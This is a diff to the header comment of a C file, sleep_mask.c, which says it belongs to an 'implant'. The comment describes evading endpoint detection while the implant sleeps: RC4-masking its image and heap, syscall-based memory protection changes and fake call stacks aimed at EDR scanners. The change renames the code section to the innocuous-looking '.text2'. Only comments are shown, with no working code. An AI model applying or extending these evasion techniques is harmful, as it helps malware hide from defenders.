@@ -1,19 +1,20 @@
 /*
  * sleep_mask.c — Obfuscated sleep: full-image RC4 masking + thread-stack spoofing.
  *
- * All functions except SleepMasked's entry check live in the .slpmsk section so
+ * All functions except SleepMasked's entry check live in the .text2 section so
  * they continue to execute after the implant's own .text is set PAGE_NOACCESS.
  *
  * Masking strategy:
- *   - FindMaskableSections collects all PE sections that are NOT .slpmsk and NOT
+ *   - FindMaskableSections collects all PE sections that are NOT .text2 and NOT
  *     writable (.text, .rdata, …).  Writable sections (.data, .bss) are skipped
  *     because they contain globals required during sleep (g_gadget, g_wait_ssn, …).
  *   - A single RC4 stream is applied across all collected sections in order; the
- *     same stream decrypts them on wake (XOR is its own inverse).
- *   - SlpNtProtect (in .slpmsk, uses g_protect_ssn) replaces NtProtect calls.
- *   - SlpTimerThread (in .slpmsk) signals the wake event; it only calls kernel32
+ *     same stream then continues across all tracked heap blocks (g_heap_track[]).
+ *     Both operations are their own inverse (XOR), so the same code path decrypts.
+ *   - SlpNtProtect (in .text2, uses g_protect_ssn) replaces NtProtect calls.
+ *   - SlpTimerThread (in .text2) signals the wake event; it only calls kernel32
  *     APIs (Sleep, SetEvent) which are never masked.
- *   - SlpSpoofedWait (in .slpmsk, mirrors SpoofedNtWait) waits on the event with
+ *   - SlpSpoofedWait (in .text2, mirrors SpoofedNtWait) waits on the event with
  *     a multi-level fake call stack visible to EDR sleeping-thread scanners.
  */
 #include "../include/implant.h"
